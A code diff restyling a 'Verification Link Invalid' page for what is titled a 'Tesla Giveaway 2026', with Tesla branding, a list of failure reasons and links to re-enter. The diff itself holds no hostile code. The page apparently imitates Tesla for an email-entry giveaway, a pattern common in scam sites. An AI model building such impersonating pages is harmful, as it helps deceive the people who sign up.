@@ -3,40 +3,52 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="theme-color" content="#000000">
-  <title>Verification Error | Tesla Giveaway</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <title>Verification Error | Tesla Giveaway 2026</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="/css/style.css">
+  <style>
+    body{background:var(--light);}
+    .page{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:88px 24px 60px;}
+    .error-card{background:white;border-radius:24px;box-shadow:0 20px 60px rgba(0,0,0,.1);padding:52px 48px;max-width:480px;width:100%;text-align:center;animation:fadeInUp .6s ease forwards;}
+    @media(max-width:540px){.error-card{padding:32px 20px;border-radius:18px;}}
+    .error-icon{width:72px;height:72px;border-radius:50%;background:rgba(227,25,55,.1);border:2px solid rgba(227,25,55,.2);display:flex;align-items:center;justify-content:center;margin:0 auto 24px;font-size:32px;}
+    .error-title{font-size:24px;font-weight:800;color:var(--dark);margin-bottom:10px;}
+    .error-sub{font-size:15px;color:var(--gray-2);line-height:1.7;margin-bottom:32px;}
+    .reasons{background:var(--light);border-radius:14px;padding:18px 20px;text-align:left;margin-bottom:28px;}
+    .reason{display:flex;align-items:flex-start;gap:10px;font-size:14px;color:var(--gray);padding:6px 0;}
+    .reason:not(:last-child){border-bottom:1px solid rgba(0,0,0,.06);}
+    .reason-dot{width:6px;height:6px;background:var(--red);border-radius:50%;margin-top:7px;flex-shrink:0;}
+  </style>
 </head>
-<body class="min-h-screen flex items-center justify-center px-4 bg-black">
-  <div class="max-w-md w-full text-center">
-    <div class="text-6xl mb-6">⚠️</div>
-    <h1 class="text-3xl font-bold mb-4">Verification <span class="gradient-text">Failed</span></h1>
-    <p class="text-gray-400 mb-8" id="errorMsg">
-      The verification link is invalid or has expired. Please try entering the giveaway again.
-    </p>
-    <div class="glass rounded-2xl p-6 mb-6">
-      <p class="text-gray-500 text-sm mb-4">Possible reasons:</p>
-      <ul class="text-gray-400 text-sm text-left space-y-2">
-        <li>• The link has expired</li>
-        <li>• The email address is not registered</li>
-        <li>• The verification token is invalid</li>
-      </ul>
-    </div>
-    <a href="/entry.html" class="glow-btn inline-block">Try Again</a>
+<body>
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="/" class="nav-logo">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
+      TESLA
+    </a>
   </div>
-  
-  <script>
-    const reason = new URLSearchParams(window.location.search).get('reason');
-    const messages = {
-      'invalid': 'The verification link is invalid. Please check your email and try again.',
-      'notfound': 'No entry was found for this email address. Please enter the giveaway first.',
-      'invalid_token': 'The verification token has expired or is invalid. Please request a new verification email.',
-      'expired': 'This verification link has expired. Please request a new one.'
-    };
-    if (reason && messages[reason]) {
-      document.getElementById('errorMsg').textContent = messages[reason];
-    }
-  </script>
+</nav>
+
+<div class="page">
+  <div class="error-card">
+    <div class="error-icon">⚠️</div>
+    <h1 class="error-title">Verification Link Invalid</h1>
+    <p class="error-sub">We were unable to verify your email address. This usually happens for one of the following reasons:</p>
+
+    <div class="reasons">
+      <div class="reason"><div class="reason-dot"></div><span>The verification link has expired (links are valid for 24 hours)</span></div>
+      <div class="reason"><div class="reason-dot"></div><span>The link was already used to verify this email address</span></div>
+      <div class="reason"><div class="reason-dot"></div><span>The link was copied incorrectly or is incomplete</span></div>
+      <div class="reason"><div class="reason-dot"></div><span>Your email address was not found in our system</span></div>
+    </div>
+
+    <div style="display:flex;flex-direction:column;gap:12px;">
+      <a href="/entry.html" class="btn btn-primary">Re-enter the Giveaway</a>
+      <a href="/" class="btn btn-ghost">Back to Home</a>
+    </div>
+  </div>
+</div>
+<script src="/js/app.js"></script>
 </body>
 </html>
